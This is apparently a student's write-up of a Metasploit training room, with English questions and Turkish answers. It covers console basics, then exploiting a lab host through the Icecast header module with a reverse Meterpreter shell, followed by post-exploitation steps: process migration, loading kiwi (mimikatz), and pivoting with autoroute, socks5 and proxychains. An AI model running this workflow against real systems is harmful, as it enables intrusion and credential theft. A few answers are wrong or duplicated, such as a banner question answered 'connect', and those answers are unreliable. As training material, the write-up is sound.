# Metasploit WriteUp

![](https://www.coengoedegebure.com/content/images/2017/09/metasploitcover.jpg)



<h4> Before starting Metasploit, we can view some of the advanced options we can trigger for starting the console. Check these out now by using the command: 

<h5> Cevap:-h parametresini koyarak kullanacağımız aracın kullanım kılavuzunu istemiş oluyoruz.Gerekli parametreleri buradan öğrenebiliriz.Kullancağımız komut msfconsole -h

---------------------



<h4> We can start the Metasploit console on the command line without showing the banner or any startup information as well. What switch do we add to msfconsole to start it without showing this information? This will include the '-'

<h5> Cevap: msfconsole her açılmasında çeşitli bannerlar ile açılır.Bu bannerların görsel olmasının dışında hiçbir fonksiyonu yoktur.Bunu önlemek için -q paremetresini kullanırız.

-------------------

<h4> Cool! We've connected to the database, which type of database does Metasploit 5 use? 

<h5>Cevap: Metasploit SQL dilini destekleyen UNIX türevi tüm işletim sistemlerinde çalışabilen postgresql veri tabanı ile çalışmaktadır.

---------------------

<h4> The help menu has a very short one-character alias, what is it?

<h5> metasploit içerisinde her defasında help komutu yazmak yerine ? kullanarak aynı görevi çağırabiliriz.

-------------------

<h4>
Finding various modules we have at our disposal within Metasploit is one of the most common commands we will leverage in the framework. What is the base command we use for searching?


<h5>Cevap:Modül adları ve açıklama gibi kısımlarını search komutu ile ararız.

---------------------

<h4>Once we've found the module we want to leverage, what command we use to select it as the active module?


<h5>Cevap:search kısmında istediğimiz modülü bulduktan sonra onu seçebilmek için use komutunu kullanırız.

---------------------

<h4>How about if we want to view information about either a specific module or just the active one we have selected?


<h5>Cevap:Seçilen modül hakkında bilgi almak istiyorsak info komutunu kullanırız.

---------------------

<h4>Entirely one of the commands purely utilized for fun, what command displays the motd/ascii art we see when we start msfconsole (without -q flag)?


<h5>Cevap:Burada cevap connect komutudur.Netcat ile port dinleme, port tarama, bağlantı oluşturma gibi birçok faaliyette bulunabiliriz. Connect de host ile iletişim kurmak için kullanılır.

---------------------

<h4>Entirely one of the commands purely utilized for fun, what command displays the motd/ascii art we see when we start msfconsole (without -q flag)?


<h5>Cevap:Tamamen görsel amaçlı kullanılan bannerlar isteğe göre banner komutu ile değiştirilebilir.

---------------------

<h4>We'll revisit these next two commands shortly, however, they're two of the most used commands within Metasploit. First, what command do we use to change the value of a variable?


<h5>Cevap:Seçilen modülde bir değişkeni değiştirmek için set komutunu kullanırız.

---------------------

<h4>Metasploit supports the use of global variables, something which is incredibly useful when you're specifically focusing on a single box. What command changes the value of a variable globally?  

<h5>Cevap:Tüm fonksiyonların dışında tanımlanan değişkenlere küresel değişkenler denir.Komut ise setg komutudur.

---------------------

<h4>Now that we've learned how to change the value of variables, how do we view them? There are technically several answers to this question, however, I'm looking for a specific three-letter command which is used to view the value of single variables.

<h5>Cevap:get komutu bir veya daha fazla değişkenin değerini almak için kullanılıyor.Cevap get komutudur.

---------------------

<h4>How about changing the value of a variable to null/no value?


<h5>Cevap: Seçilen modülde girilmiş modülde ki değişkeni unset komutu ile pasif hale getiririz.set komutunun tam tersidir.

---------------------


<h4>When performing a penetration test it's quite common to record your screen either for further review or for providing evidence of any actions taken. This is often coupled with the collection of console output to a file as it can be incredibly useful to grep for different pieces of information output to the screen. What command can we use to set our console output to save to a file?


<h5>Cevap:grep komutu dosya içerisinde bazı verilere ulaşmamızı sağlar ancak spool komutu dosyayı yazdırmamıza yardım eden komuttur.Cevap:spool komutu.

---------------------

<h4>Leaving a Metasploit console running isn't always convenient and it can be helpful to have all of our previously set values load when starting up Metasploit. What command can we use to store the settings/active datastores from Metasploit to a settings file? This will save within your msf4 (or msf5) directory and can be undone easily by simply removing the created settings file. 


<h5>Cevap:Aktif veri deposuna kayıt eder.Cevap save komutudur.

---------------------

<h4>Easily the most common module utilized, which module holds all of the exploit code we will use?


<h5>Cevap:Exploit kelime anlamı olarak sömürmek,istismar etmek anlamına gelir.Cevap exploit

---------------------

<h4>Used hand in hand with exploits, which module contains the various bits of shellcode we send to have executed following exploitation?


<h5>Cevap:payload

---------------------

<h4>Which module is most commonly used in scanning and verification machines are exploitable? This is not the same as the actual exploitation of course.


<h5>Cevap:auxiliary

---------------------

<h4>One of the most common activities after exploitation is looting and pivoting. Which module provides these capabilities?


<h5>Cevap:post

---------------------

<h4>Commonly utilized in payload obfuscation, which module allows us to modify the 'appearance' of our exploit such that we may avoid signature detection?


<h5>Cevap:encoder

---------------------

<h4>Last but not least, which module is used with buffer overflow and ROP attacks?


<h5>Cevap:nop Bellek yerini öğrenmek amaçlı bellek dolduran bitler. Genellikle saldırı tespit ve engelleme sistemlerini aşmak için kullanılır. Buffer Overflow (Arabellek Taşması); bir depolama alanında tutabileceğinden daha fazla veri depolamaya çalışıldığında oluşur. ROP saldırısının açılımı ise Return-oriented programming olarak geçer. Mevcut küçük kod dizilerini yeniden kullanan bir aygıt zinciri oluşturarak rastgele istenmeyen işlemler gerçekleştirebilen istismar tekniğidir.

---------------------

<h4>Not every module is loaded in by default, what command can we use to load different modules? 


<h5>Cevap:load

---------------------

<h4>Metasploit comes with a built-in way to run nmap and feed it's results directly into our database. Let's run that now by using the command 

<h5>Cevap:Burada nmap taraması yapılması istenmiş ancak db_nmap komutunu kullanmamız gerek db_nmap kullanırsak sonuçlar otomatik olarak host tablolarına aktarılır.Normal nmap taramasında ise sonuçlar bir dosyaya aktarılır ve daha sonra metasploit tablosuna import edilir.

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m1.PNG)

---------------------

<h4>What service does nmap identify running on port 135?


<h5>Cevap:msrpc

![]()

---------------------

<h4>Let's go ahead and see what information we have collected in the database. Try typing the command hosts into the msfconsole now.


<h5>Cevap:

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m2.PNG)

---------------------

<h4>How about something else from the database, try the command services now.


<h5>Cevap:

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m3.PNG)

---------------------

<h4>Now that we've scanned our victim system, let's try connecting to it with a Metasploit payload. First, we'll have to search for the target payload. In Metasploit 5 (the most recent version at the time of writing) you can simply type use followed by a unique string found within only the target exploit. For example, try this out now with the following command use icecast. What is the full path for our exploit that now appears on the msfconsole prompt? *This will include the exploit section at the start


<h5>Cevap:exploit/windows/http/icecast_header

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m4.PNG)

---------------------

<h4>Now type the command use NUMBER_FROM_PREVIOUS_QUESTION. This is the short way to use modules returned by search results. 


<h5>Cevap:

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m7.PNG)

---------------------

<h4>Next, let's set the payload using this command set PAYLOAD windows/meterpreter/reverse_tcp. In this way, we can modify which payloads we want to use with our exploits. Additionally, let's run this command set LHOST YOUR_IP_ON_TRYHACKME. You might have to check your IP using the command ip addr, it will likely be your tun0 interface.

<h5>Cevap:

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m8.PNG)

---------------------

<h4>Let's go ahead and return to our previous exploit, run the command use icecast to select it again.


<h5>Cevap:

![]()

---------------------

<h4>Once you're set those variables correctly, run the exploit now via either the command exploit or the command run -j to run this as a job.

<h5>Cevap:

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m10.PNG)


---------------------

<h4>After we've established our connection in the next task, we can list all of our sessions using the command sessions. Similarly, we can interact with a target session using the command sessions -i SESSION_NUMBER

<h5>Cevap:

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m11.PNG)

---------------------

<h4>First things first, our initial shell/process typically isn't very stable. Let's go ahead and attempt to move to a different process. First, let's list the processes using the command ps. What's the name of the spool service?


<h5>Cevap:spoolsv.exe

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m12.PNG)

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m12.1.PNG)

---------------------

<h4>Let's go ahead and move into the spool process or at least attempt to! What command do we use to transfer ourselves into the process? This won't work at the current time as we don't have sufficient privileges but we can still try!


<h5>Cevap:migrate

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m13.PNG)

---------------------

<h4>Well that migration didn't work, let's find out some more information about the system so we can try to elevate. What command can we run to find out more information regarding the current user running the process we are in?


<h5>Cevap:getuid

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m13.PNG)

---------------------

<h4>How about finding more information out about the system itself?

<h5>Cevap:sysinfo

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m14.PNG)

---------------------

<h4>This might take a little bit of googling, what do we run to load mimikatz (more specifically the new version of mimikatz) so we can use it? 


<h5>Cevap:load kiwi

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m15.PNG)

---------------------

<h4>Let's go ahead and figure out the privileges of our current user, what command do we run?


<h5>Cevap:getprivs

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m16.PNG)

---------------------

<h4>What command do we run to transfer files to our victim computer?


<h5>Cevap:upload / yardım menüsünden cevabı bulabiliriz

![]()

---------------------

<h4>How about if we want to run a Metasploit module?


<h5>Cevap:run

![]()

---------------------

<h4>A simple question but still quite necessary, what command do we run to figure out the networking information and interfaces on our victim?


<h5>Cevap:

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m17.PNG)

---------------------

<h4>Let's go ahead and run a few post modules from Metasploit. First, let's run the command run post/windows/gather/checkvm . This will determine if we're in a VM, a very useful piece of knowledge for further pivoting.


<h5>Cevap:

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m19.PNG)


---------------------


<h4>One quick extra question, what command can we run in our meterpreter session to spawn a normal system shell?

<h5>Cevap:shell

![]()

---------------------


<h4>Let's go ahead and run the command run autoroute -h, this will pull up the help menu for autoroute. What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the -n flag in your answer.


<h5>Cevap:run autoroute -s 172.18.1.0 -n 255.255.255.0

![](https://raw.githubusercontent.com/cagatayceyhan/terminal_Img/main/m20.PNG)

---------------------


<h4>Additionally, we can start a socks5 proxy server out of this session. Background our current meterpreter session and run the command search server/socks5. What is the full path to the socks5 auxiliary module?


<h5>Cevap:auxiliary/server/socks5

![]()

---------------------


<h4>Once we've started a socks server we can modify our /etc/proxychains.conf file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks5 server with proxychains?


<h5>Cevap:proxychains

![]()

---------------------

